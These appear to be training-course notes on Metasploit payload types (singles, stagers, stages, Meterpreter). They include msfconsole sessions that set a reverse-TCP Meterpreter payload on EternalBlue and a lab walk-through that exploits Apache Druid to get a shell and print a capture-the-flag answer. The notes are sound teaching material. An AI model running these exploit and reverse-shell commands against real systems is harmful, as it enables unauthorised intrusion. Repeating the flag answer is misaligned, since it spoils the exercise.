A `Payload` in Metasploit refers to a module that aids the exploit module in (typically) returning a shell to the attacker.
The payloads are sent together with the exploit itself to bypass standard functioning procedures of the vulnerable service (`exploits job`) and then run on the target OS to typically return a reverse connection to the attacker and establish a foothold (`payload's job`).

There are three different types of payload modules in the Metasploit Framework: Singles, Stagers, and Stages.
For example, `windows/shell_bind_tcp` is a single payload with no stage, whereas `windows/shell/bind_tcp` consists of a stager (`bind_tcp`) and a stage (`shell`).

#### Singles
A `Single` payload contains the exploit and the entire shellcode for the selected task. Inline payloads are by design more stable than their counterparts because they contain everything all-in-one. However, some exploits will not support the resulting size of these payloads as they can get quite large.

#### Stagers
`Stager` payloads work with Stage payloads to perform a specific task. A Stager is waiting on the attacker machine, ready to establish a connection to the victim host once the stage completes its run on the remote host. `Stagers` are typically used to set up a network connection between the attacker and victim and are designed to be small and reliable.

#### Stages
`Stages` are payload components that are downloaded by stager's modules. The various payload Stages provide advanced features with no size limits, such as Meterpreter, VNC Injection, and others. Payload stages automatically use middle stagers:
- A single `recv()` fails with large payloads
- The Stager receives the middle stager
- The middle Stager then performs a full download
- Also better for RWX

## Staged Payloads
A staged payload is, simply put, an `exploitation process` that is modularized and functionally separated to help segregate the different functions it accomplishes into different code blocks, each completing its objective individually but working on chaining the attack together. This will ultimately grant an attacker remote access to the target machine if all the stages work correctly.

`Stage0` of a staged payload represents the initial shellcode sent over the network to the target machine's vulnerable service, which has the sole purpose of initializing a connection back to the attacker machine.

#### MSF - Staged Payloads

#### Meterpreter Payload
The `Meterpreter` payload is a specific type of multi-faceted payload that uses `DLL injection` to ensure the connection to the victim host is stable, hard to detect by simple checks, and persistent across reboots or system changes. Meterpreter resides completely in the memory of the remote host and leaves no traces on the hard drive, making it very difficult to detect with conventional forensic techniques. In addition, scripts and plugins can be `loaded and unloaded` dynamically as required.

## Searching for Payloads
To select our first payload, we need to know what we want to do on the target machine. For example, if we are going for access persistence, we will probably want to select a Meterpreter payload.
As mentioned above, Meterpreter payloads offer us a significant amount of flexibility. Their base functionality is already vast and influential. We can automate and quickly deliver combined with plugins such as [GentilKiwi's Mimikatz Plugin](https://github.com/gentilkiwi/mimikatz) parts of the pentest while keeping an organized, time-effective assessment.

#### MSF - List Payloads
```shell-session
msf6 > show payloads

535  windows/x64/meterpreter/bind_ipv6_tcp                                
536  windows/x64/meterpreter/bind_ipv6_tcp_uuid                           
537  windows/x64/meterpreter/bind_named_pipe                              
538  windows/x64/meterpreter/bind_tcp                                     
539  windows/x64/meterpreter/bind_tcp_rc4                                 
540  windows/x64/meterpreter/bind_tcp_uuid                                
541  windows/x64/meterpreter/reverse_http                                 
542  windows/x64/meterpreter/reverse_https                                
543  windows/x64/meterpreter/reverse_named_pipe                           
544  windows/x64/meterpreter/reverse_tcp                                  
545  windows/x64/meterpreter/reverse_tcp_rc4                              
546  windows/x64/meterpreter/reverse_tcp_uuid                             
547  windows/x64/meterpreter/reverse_winhttp                              
548  windows/x64/meterpreter/reverse_winhttps                             
```

As seen above, there are a lot of available payloads to choose from. Not only that, but we can create our payloads using `msfvenom`, but we will dive into that a little bit later. We will use the same target as before, and instead of using the default payload, which is a simple `reverse_tcp_shell`, we will be using a `Meterpreter Payload for Windows 7(x64)`.

As we can see, it can be pretty time-consuming to find the desired payload with such an extensive list. We can also use `grep` in `msfconsole` to filter out specific terms. This would speed up the search and, therefore, our selection.
We have to enter the `grep` command with the corresponding parameter at the beginning and then the command in which the filtering should happen. For example, let us assume that we want to have a `TCP` based `reverse shell` handled by `Meterpreter` for our exploit. Accordingly, we can first search for all results that contain the word `Meterpreter` in the payloads.

#### MSF - Searching for Specific Payload
```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter show payloads
```

This gives us a total of `14` results. Now we can add another `grep` command after the first one and search for `reverse_tcp`.

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter grep reverse_tcp show payloads
```
## Selecting Payloads

Same as with the module, we need the index number of the entry we would like to use. To set the payload for the currently selected module, we use `set payload <no.>` only after selecting an Exploit module to begin with.

```shell
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter grep reverse_tcp show payloads

   15  payload/windows/x64/meterpreter/reverse_tcp                        
   16  payload/windows/x64/meterpreter/reverse_tcp_rc4               
   17  payload/windows/x64/meterpreter/reverse_tcp_uuid                   

msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 15

payload => windows/x64/meterpreter/reverse_tcp
```

#### MSF - Exploit and Payload Configuration

Simply set the rights options for payload and module.
Then, we can run the exploit and see what it returns. Check out the differences in the output below:
```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
```

#### MSF - Meterpreter Navigation
```shell-session
meterpreter > shell

Process 2664 created.
Channel 1 created.

Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.

C:\Users>
```

`Channel 1` has been created, and we are automatically placed into the CLI for this machine. The channel here represents the connection between our device and the target host, which has been established in a reverse TCP connection (from the target host to us) using a Meterpreter Stager and Stage. The stager was activated on our machine to await a connection request initialized by the Stage payload on the target machine.

## Payload Types
|**Payload**|**Description**|
|---|---|
|`generic/custom`|Generic listener, multi-use|
|`generic/shell_bind_tcp`|Generic listener, multi-use, normal shell, TCP connection binding|
|`generic/shell_reverse_tcp`|Generic listener, multi-use, normal shell, reverse TCP connection|
|`windows/x64/exec`|Executes an arbitrary command (Windows x64)|
|`windows/x64/loadlibrary`|Loads an arbitrary x64 library path|
|`windows/x64/messagebox`|Spawns a dialog via MessageBox using a customizable title, text & icon|
|`windows/x64/shell_reverse_tcp`|Normal shell, single payload, reverse TCP connection|
|`windows/x64/shell/reverse_tcp`|Normal shell, stager + stage, reverse TCP connection|
|`windows/x64/shell/bind_ipv6_tcp`|Normal shell, stager + stage, IPv6 Bind TCP stager|
|`windows/x64/meterpreter/$`|Meterpreter payload + varieties above|
|`windows/x64/powershell/$`|Interactive PowerShell sessions + varieties above|
|`windows/x64/vncinject/$`|VNC Server (Reflective Injection) + varieties above|

### Questions 

1. Exploit the Apache Druid service and find the flag.txt file. Submit the contents of this file as the answer.
```shell
First let's find the port on which Apache Druid is running:

> nmap -p- -T4 10.129.203.52
PORT     STATE SERVICE
22/tcp   open  ssh
2181/tcp open  eforward
8081/tcp open  blackice-icecap
8082/tcp open  blackice-alerts
8083/tcp open  us-srv
8091/tcp open  jamlink
8888/tcp open  sun-answerbook

> nmap -A -p2181,8081,8082,8083,8091,8888 -T4 10.129.203.52
8081/tcp open  http      Jetty 9.4.12.v20180830
| http-title: Apache Druid
|_Requested resource was http://10.129.203.52:8081/unified-console.html
|_http-server-header: Jetty(9.4.12.v20180830)

Go to : http://10.129.203.52:8081/
We can see that the webapp is running Apache Druid 0.17.1, let's check if this version is vulnerable.
We find this: # Apache Druid 0.20.0 Remote Command Execution

Let's exploit this vulnerability with metasploit:
msf > use exploit/linux/http/apache_druid_js_rce
set lhost tun0
set rhosts 10.129.203.52
run

meterpreter > shell
Process 2278 created.
Channel 1 created.
find / -name flag.txt 2>/dev/null
/root/flag.txt

cat /root/flag.txt
HTB{MSF_Expl01t4t10n}
```